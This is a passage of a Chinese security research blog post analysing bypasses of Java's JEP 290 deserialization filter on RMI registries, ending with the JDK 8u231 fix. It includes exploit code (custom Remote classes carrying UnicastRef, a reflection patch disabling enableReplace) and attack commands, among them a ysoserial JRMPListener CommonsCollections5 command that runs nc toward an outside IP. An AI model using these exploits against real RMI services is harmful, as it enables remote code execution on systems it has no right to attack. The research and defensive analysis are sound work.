class="title">Remote</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>利用构造方法可以容纳一个UnicastRef对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//javax.management.remote.rmi.RMIConnectionImpl_Stub#RMIConnectionImpl_Stub 构造方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RMIConnectionImpl_Stub</span><span class="params">(java.rmi.server.RemoteRef ref)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.rmi.server.RemoteStub#RemoteStub(java.rmi.server.RemoteRef) 构造方法</span></span><br><span class="line"> <span class="function"><span class="keyword">protected</span> <span class="title">RemoteStub</span><span class="params">(RemoteRef ref)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.rmi.server.RemoteObject#RemoteObject(java.rmi.server.RemoteRef) 构造方法</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">RemoteObject</span><span class="params">(RemoteRef newref)</span> </span>&#123;</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>攻击代码就很简单，跟RemoteObjectInvocationHandler完全一致改个参数就完事了，放个图表示可以：</p><blockquote><p>详细代码参考github Bypass290.java</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17bgrq6oj324a17marh.jpg" alt="绕过JEP-remote参数-RMIConnectionImpl_Stub.png"></p><h6 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h6><p>UnicastRemoteObject实际上满足我们说的所有条件，但是是不可以利用的。</p><p>它的确是Remote接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.rmi.server.UnicastRemoteObject定义</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">extends</span> <span class="title">RemoteServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.rmi.server.RemoteServer定义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteServer</span> <span class="keyword">extends</span> <span class="title">RemoteObject</span>//这个就是了 不赘述</span></span><br><span class="line"><span class="class"></span>&#123;</span><br></pre></td></tr></table></figure><p>同样由于继承自RemoteObject，所以同样有一个RemoteObject类中的ref参数，但是在UnicastRemoteObject类中，没有使用到。</p><p>我们实际上也是可以操控这个变量的，之前是通过构造函数直接赋值，现在可以通过反射机制来赋值，实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3.UnicastRemoteObject</span></span><br><span class="line"><span class="comment">//3.1.获取到UnicastRemoteObject的实例</span></span><br><span class="line">Class clazz = Class.forName(<span class="string">"java.rmi.server.UnicastRemoteObject"</span>);</span><br><span class="line">Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">UnicastRemoteObject UnicastRemoteObject_obj =(UnicastRemoteObject)m.newInstance();</span><br><span class="line"><span class="comment">//3.2.修改实例的ref参数（使用yso中的模块）</span></span><br><span class="line">Reflections.setFieldValue(UnicastRemoteObject_obj,<span class="string">"ref"</span>,ref);</span><br></pre></td></tr></table></figure><p>可以对比下三个对象的内容，都包含了我们修改的ref对象，没问题。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17br86p2j31mg15jqbm.jpg" alt="绕过JEP-remote参数-三者对比.png"></p><p>但是在实际利用的时候，<strong>使用UnicastRemoteObject是不可以的！</strong>一开始我也非常的疑惑：这不科学！，但是代码是死肥宅最忠实的伙伴，它是不会骗人的。</p><blockquote><p><a href="http://www.codersec.net/2018/09/一次攻击内网rmi服务的深思/" target="_blank" rel="noopener">bsmali4师傅的一次攻击内网RMI服务的深思</a>这篇文章中发现了这个问题，但是他的结论是由于ref是一个transient类型的变量，不会反序列化。</p><p>但实际上可以攻击的RMIConnectionImpl_Stub类也是使用transient类型的ref。所以这个结论是错误的</p></blockquote><p>其实关键点在于：</p><ul><li>我们默认理解为序列化过程是对于我们的恶意object进行writeobject，<code>RMIConnectionImpl_Stub.writeobject()</code>、<code>UnicastRemoteObject.writeobject()</code>那么当然是序列化的。（实际上也可以，在github的Bypass290代码中尝试序列化写入了文件中进行查看，结果也是把正确的ref值写入了，就不贴图了）</li><li>但是实际上客户端序列化的过程为：ObjectOutput.writeobject(我们的恶意object)</li></ul><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17d62azlj31500s80vo.jpg" alt="绕过JEP-remote参数-回顾实际序列化过程.png"></p><p>那么实际上这边的序列化逻辑与我们想象的有点出入，<strong>他会去替换掉我们辛辛苦苦生成的object</strong>。这是导致同是继承RemoteObject有的行，有的不行的关键。</p><p>我们在<code>java.io.ObjectOutputStream#writeObject0</code>打入断点，使用UnicastRemoteObject对象来攻击，细看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">     depth++;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">//一大堆类型检查，都不会通过</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">// 想要去检查替换我们的object</span></span><br><span class="line">         Object orig = obj;</span><br><span class="line">         Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">         ObjectStreamClass desc;</span><br><span class="line">         <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">             <span class="comment">//查找相关内容</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (enableReplace) &#123;<span class="comment">//都是true</span></span><br><span class="line">         <span class="comment">//!!!!!!!!!!!此处替换了我们的对象！！！！！！！！！！</span></span><br><span class="line">             Object rep = replaceObject(obj);</span><br><span class="line">             <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                 cl = rep.getClass();</span><br><span class="line">                 desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             obj = rep;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一些替换后的处理，不太重要</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">// 通过类进行分配序列化过程</span></span><br><span class="line">         <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">             writeString((String) obj, unshared);</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">             writeArray(obj, desc, unshared);</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">             writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">         <span class="comment">//进入此处再开始正常的序列化</span></span><br><span class="line">             writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">         <span class="comment">//...省略...</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>UnicastRemoteObject在此处的情况，发生了变化：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17dcc242j31mq0vwaen.jpg" alt="绕过JEP-remote参数-UnicastRemoteObject替换.png"></p><p>RMIConnectionImpl_Stub在此处的情况，没有发生变化：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17dhs3z2j31fr0vtn14.jpg" alt="绕过JEP-remote参数-RMIConnectionImpl_Stub替换.png"></p><p>repalceobject替换的方法具体在<code>sun.rmi.server.MarshalOutputStream#replaceObject</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1就是我们想要序列化的类</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title">replaceObject</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//这个类要是Remote接口的，并且不是RemoteStub接口的，为true</span></span><br><span class="line">    <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote &amp;&amp; !(var1 <span class="keyword">instanceof</span> RemoteStub)) &#123;</span><br><span class="line">        <span class="comment">//这里会去获取到新的对象来替换</span></span><br><span class="line">        <span class="comment">//UnicastRemoteObject走的就是这条路</span></span><br><span class="line">        Target var2 = ObjectTable.getTarget((Remote)var1);</span><br><span class="line">        <span class="keyword">if</span> (var2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> var2.getStub();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//RMIConnectionImpl_Stub走的就是这条路</span></span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就很明显了，之前我们觉得只要是remote接口就行了，这个定义有问题，实际上要满足以下两个条件的类我们才能用：</p><ol><li>是Remote接口</li><li>并且是RemoteStub接口</li></ol><blockquote><p>这里的逻辑关系需要倒一下，是Remote 又不是RemoteStub是不行的，又要是Remote的</p></blockquote><p>那么我们就找到了为啥RMIConnectionImple_Stub可以，但是UnicastRemoteObject不行的原因。</p><p>找Remote的继承类就可以轻而易举找到跟RMIConnectionImple_Stub类似的其他类。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17dpwbddj31fc0btmzt.jpg" alt="绕过JEP-remote-满足的类.png"></p><p>这些理论都是可以的，就不一一实验了。</p><h6 id="新的小问题-RemoteObjectInvocationHandler为啥又可以了"><a href="#新的小问题-RemoteObjectInvocationHandler为啥又可以了" class="headerlink" title="新的小问题-RemoteObjectInvocationHandler为啥又可以了"></a>新的小问题-RemoteObjectInvocationHandler为啥又可以了</h6><p>但是我们又会发现一开始就成功的RemoteObjectInvocationHandler并不满足我们的出来的规定，它是Remote接口但是不是RemoteStub接口呀。</p><p>继续调试</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17e29802j31m00qz77a.jpg" alt="绕过JEP-remote-RemoteObjectInvocationHandler.png"></p><p>发现虽然它不满足条件进入了if，但是获取到的替换类var2为空，又返回原本的值了。</p><p>至于为什么会获取到的结果var2为空，是因为在getTarget中会去内部查询，因为InvocationHandler的特性所以类型转化不到原始类所以为空（胡说八道中，反正跟InvocationHandler脱不了干系）</p><p>至此我们就完全搞清楚了找一个带UnicastRef类型参数的实现Remote接口的类的时候需要：</p><ol><li>这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li><li>这个类要是Remote接口的并且是RemoteStub接口</li><li>这个类要是Remote接口并且不是RemoteStub接口要是获取不到原来的类也可以，比如RemoteInvocationHandler</li></ol><h6 id="绕过序列化过程中的替换使所有类均可用于攻击"><a href="#绕过序列化过程中的替换使所有类均可用于攻击" class="headerlink" title="绕过序列化过程中的替换使所有类均可用于攻击"></a>绕过序列化过程中的替换使所有类均可用于攻击</h6><p>从<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">国外老哥的文章</a>中得到的思路。</p><p>在分析中我们发现<strong>ObjectOutputStream对象流</strong>中的<strong>enableReplace</strong>全局变量决定了我们的对象是否会被替换：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectOutputStream</span></span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">OutputStream</span> <span class="keyword">implements</span> <span class="title">ObjectOutput</span>, <span class="title">ObjectStreamConstants</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** if true, invoke replaceObject() */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> enableReplace;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (enableReplace) &#123;<span class="comment">//都是true</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>那么其实我们只要用反射机制，在序列化前把out对象的<strong>enableReplace属性修改为false</strong>就可以了(这需要重新实现bind查询，来进行修改)。大概如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line"><span class="comment">//反射修改enableReplace</span></span><br><span class="line">ReflectionHelper.setFieldValue(out, <span class="string">"enableReplace"</span>, <span class="keyword">false</span>);</span><br><span class="line">out.writeObject(obj); <span class="comment">// 写入我们的对象</span></span><br></pre></td></tr></table></figure><blockquote><p>这些绕过我都已经在<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>中完成了实现。（没错看到后面，你会发现一开始打算自己做的，然后发现ysomap已经完成了一部分，秉着打不过他就加入他的原则，开始为ysomap添砖加瓦）</p></blockquote><h5 id="4-带UnicastRef类型参数的实现Remote接口的类—自定义"><a href="#4-带UnicastRef类型参数的实现Remote接口的类—自定义" class="headerlink" title="4.带UnicastRef类型参数的实现Remote接口的类—自定义"></a>4.带UnicastRef类型参数的实现Remote接口的类—自定义</h5><p>但是如果我们回忆之前的出的结论：</p><blockquote><p>反序列化打服务端，可以使用一个服务端不存在的类。在这个服务端不存在的类的变量中放入payload，这个payload会在服务端反序列化这个不存在的类的时候触发，虽然会报错，但是会触发。</p></blockquote><p>我们实际上之前做的所有的研究都是无用功，因为我们压根不用去找一个存在于JDK中的类去满足条件来进行攻击，而是自己写一个就可以了。</p><p>这个结论让我非常沮丧，我也希望有人告诉我不是这样的，但是实验结果就是如此，他就是可以攻击成功。我甚至打包了没有包含自定义的类的jar放到远程服务器上，但是仍然可以。</p><p>实现一个可以序列化的remote接口的类，然后正常攻击</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">lala_remote</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> RemoteRef ref;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">lala_remote</span><span class="params">(UnicastRef remoteref)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        ref=remoteref;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以注意到不是RemoteStub接口，自实现的类会满足上卖弄整理的第三种情况，不会被替换对象。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17e8s4orj323o0xcqh5.jpg" alt="绕过JEP-remote-自定义.png"></p><p>又是报错报着找不到class，但是弹框成功。</p><p>远程的（用8u111）。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17ei6nrcj31qk0j0tb6.jpg" alt="绕过JEP-remote-自定义-远程.png"></p><p>也是非常有趣，大家都是用已经写好的poc、ysoserial，但实际上…….随便搞搞就可以用了。</p><blockquote><p>此处为ysomap添加了一个自定义类的模块RMIConnectCustomized，来证明可行性。</p></blockquote><h4 id="bind的局限性"><a href="#bind的局限性" class="headerlink" title="bind的局限性"></a>bind的局限性</h4><p>好的，重新整理心情。来讨论随便的bind的局限性。</p><p>当我们在本地进行试验的时候，使用高于8u141的版本也是可以命令执行的。这会形成一种不受版本限制的错觉。</p><p>但实际上在远程攻击的时候，这种攻击是有局限性的。</p><ol><li>我们把github的代码打包一下，放到远程服务器上，运行靶机<code>java -cp RMIDeserialize.jar com.lala.ServerAndRegister</code>（服务器会有危险）</li><li>服务端再起一个JRMP-Listener。<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 11 CommonsCollections5 &quot;nc 47.102.137.xxx:10000&quot;</code>（用nc来表示命令执行。ps.讲道理不应该在靶机上起一个攻击者的攻击用服务，但是我没有更多的服务器了…）</li><li><code>nc -lvvp 10000</code>服务器通过nc监听来判断命令执行是否成功</li><li>本地Bypass290代码改成远程攻击端口</li><li>运行Bypass290攻击</li></ol><p>服务器8u131环境成功。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17fk9n04j31b10bin3g.jpg" alt="绕过JEP290-远程测试1.png"></p><p>服务器8u161失败</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17g0msfwj325v0jiwid.jpg" alt="绕过JEP290-远程测试8u61.png"></p><p>回忆之前的说明，原因同样是bind操作中注册端对于服务端的地址验证。</p><p>那么根据之前的结论，我们可以通过lookup来替换bind操作来进行攻击，这样可以绕过bind操作中对于服务端得地址验证。</p><h3 id="与RMI客户端反序列化攻击RMI服务端-Lookup结合"><a href="#与RMI客户端反序列化攻击RMI服务端-Lookup结合" class="headerlink" title="与RMI客户端反序列化攻击RMI服务端-Lookup结合"></a>与RMI客户端反序列化攻击RMI服务端-Lookup结合</h3><p>这边参照Barmie的bind攻击思路，使用拦截器来替换攻击包的字节码，来自己重构一个攻击包的字节码。这个思路非常底层和繁琐，但是理论上可以绕过所有客户端限制逻辑。</p><h4 id="基于Barmie拦截器的自实现"><a href="#基于Barmie拦截器的自实现" class="headerlink" title="基于Barmie拦截器的自实现"></a>基于Barmie拦截器的自实现</h4><p>我把Barmie的拦截器逻辑拔了出来，放到了Github的RMI-Bypass290项目下。</p><p>在Barmie的原逻辑中，拦截器中字节码的拼接非常简单粗暴，他会保留一些包头固定格式，然后修改参数。通常都是直接复制成功的poc的16进制字节码，然后修改其中命令执行的16进制代码，再拼接进入数据包进行发送。比如CC的payload是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String _header_chunk = <span class="string">"737200116a6176612e757469...."</span>;<span class="comment">//开头的序列化信息</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String _footer_chunk = <span class="string">"740004657865637571007e00...."</span>;<span class="comment">//结尾的序列化信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//开头塞进去</span></span><br><span class="line">out.write(<span class="keyword">this</span>.fixReferences(<span class="keyword">this</span>.hexStrToByteArray(<span class="keyword">this</span>._header_chunk), refCorrection));</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义添加要执行的String形式的命令</span></span><br><span class="line">out.write(<span class="keyword">this</span>.stringToUtf8ByteArray(cmd));</span><br><span class="line"></span><br><span class="line"><span class="comment">//结尾塞进去</span></span><br><span class="line">out.write(<span class="keyword">this</span>.fixReferences(<span class="keyword">this</span>.hexStrToByteArray(<span class="keyword">this</span>._footer_chunk), refCorrection));</span><br></pre></td></tr></table></figure><p>我们的Remote接口的对象原本也可以按照这个思路，找一个成功的数据包，然后修改其中的JRMP服务器回连IP和端口就行了。</p><p>但是对比JRMP服务器地址：888.888.888.888:8887、888.888.888.888:8888两次攻击数据包发现：</p><p>JRMP服务器回连IP可以简单进行修改，但是端口却是不可以显性直接进行修改的。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17g7sshcj31wj14kdk3.jpg" alt="绕过JEP-remote-自定义-攻击包对比.png"></p><p>那么就尝试自己去构造一个序列化对象（由于要与攻击成功数据包进行对比，我们就是用序列化结构更通用的RMIConnectionImpl_Stub类。因为使用自实现类，不同地方包名会不一样不方便）</p><p>写完代码后，发现直接序列化不能正常利用攻击，与攻击成功数据包对比发现需要修正000078-&gt;00007078。（这里应该是不同的输入流对象对于序列化的处理不同导致的）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gdrr1nj32090ow40n.jpg" alt="绕过JEP-remote-自定义-攻击包对比2.png"></p><p>重新微调，在<code>payloads.BypassJEP290_RMIConnectionImpl_Stub#getBytes</code>中进行类实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用RMIConnectionImpl_Stub类</span></span><br><span class="line">RMIConnectionImpl_Stub RMIConnectionImpl_Stub_obj = <span class="keyword">new</span> RMIConnectionImpl_Stub(ref);</span><br><span class="line"><span class="comment">//序列化，同时修正000078-&gt;00007078</span></span><br><span class="line"><span class="keyword">byte</span>[] serial_Primary=serialize(RMIConnectionImpl_Stub_obj);</span><br><span class="line"><span class="comment">//除去aced开头（序列化开头）</span></span><br><span class="line"><span class="keyword">byte</span>[] serial_byte= <span class="keyword">new</span> <span class="keyword">byte</span>[serial_Primary.length-<span class="number">4</span>];</span><br><span class="line">System.arraycopy(serial_Primary, <span class="number">4</span>, serial_byte, <span class="number">0</span>, serial_byte.length);</span><br><span class="line"><span class="comment">//填入传输流</span></span><br><span class="line">out.write(<span class="keyword">this</span>.fixReferences(serial_byte));</span><br></pre></td></tr></table></figure><p>完毕。打包成jar发布在github的release中了。</p><p><code>java -jar RMI-Bypass290.jar 47.xx.xx.xx 1099 47.xx.xx.xx 1199</code>（前者攻击目标IP和端口，后者JRMP服务器IP和端口）直接测试服务端161版本。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gjbogdj329v17zn66.jpg" alt="绕过JEP-remote-poc验证.png"></p><h4 id="重实现lookup逻辑"><a href="#重实现lookup逻辑" class="headerlink" title="重实现lookup逻辑"></a>重实现lookup逻辑</h4><p>虽然工具完成了，但是这么实现着实费劲，一开始以为压根没有人实现这个工具，最后发现wh1tp1g已经集成到他的<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>中了（然后打不过他就加入了他= =）.</p><p>而且实现的方法更为聪明，只是做了上层lookup函数的重写，这样子就实现起来就很简单简洁，且不用考虑底层字节的各种情况。</p><p><code>ysomap.core.exploit.rmi.component.Naming#lookup</code>直接把原来的接口<code>lookup(String)</code>调成<code>lookup(Object)</code>（实现不是如此，逻辑是如此，数据包封装的逻辑实际上直接照搬过来就可以了）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//多加了个registry参数，然后自己实现部分固定值的获取</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span><span class="params">(Registry registry, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, <span class="string">"ref"</span>);</span><br><span class="line">        <span class="keyword">long</span> interfaceHash = (<span class="keyword">long</span>) ReflectionHelper.getFieldValue(registry, <span class="string">"interfaceHash"</span>);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, <span class="string">"operations"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        ....<span class="comment">//之后就跟原来的lookup一样了</span></span><br><span class="line">            <span class="comment">//同时这里我还加入了绕过enableReplace，使UnicastRemoteObject可用</span></span><br></pre></td></tr></table></figure><h3 id="8u231的修复"><a href="#8u231的修复" class="headerlink" title="8u231的修复"></a>8u231的修复</h3><p>选取了两个版本8u211b12和8u231b11进行测试，使用自定义类的payload模块，8u211可以攻击，8u231不能攻击。</p><blockquote><p>其中8u231b11版本是从Oracle官网下载的。</p><p>如果从openjdk中查找更新的具体版本，那就是8u232b09（感谢wh1t3p1g）</p><p>其实一直没搞懂为啥这个版本号的问题，为啥openjdk里没有8u231呢，如果有人知道希望可以回复我谢谢。</p></blockquote><p>先看测试结果。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gtcj7cj31af0pmtkp.jpg" alt="8u211测试.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gxie69j30rf08hq32.jpg" alt="8u231失败.png"></p><p>对比JDK做了两处修复：</p><ol><li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref</li><li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单</li></ol><h4 id="第一处修复"><a href="#第一处修复" class="headerlink" title="第一处修复"></a>第一处修复</h4><blockquote><p>在openjdk中可以在线查看对比<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java" target="_blank" rel="noopener">8u232u8的RegistryImpl_Skel.java</a>与<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java" target="_blank" rel="noopener">8u232u9的RegistryImpl_Skel.java</a></p></blockquote><p>其实只有一行的区别，在每个动作比如lookup，bind等中都添加了一个逻辑：<strong>如果出现了序列化报错都会进入catch，执行<code>discardPedingRefs</code></strong>。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17h6iywgj31200b9wf8.jpg" alt="8u231修复第一处.png"></p><p>在<code>sun.rmi.transport.StreamRemoteCall#discardPendingRefs</code>中其实也就是做了一件事情，把我们之前装载的<code>incomingRefTable</code>清空</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discardPendingRefs</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.in.discardRefs();<span class="comment">//去下面</span></span><br><span 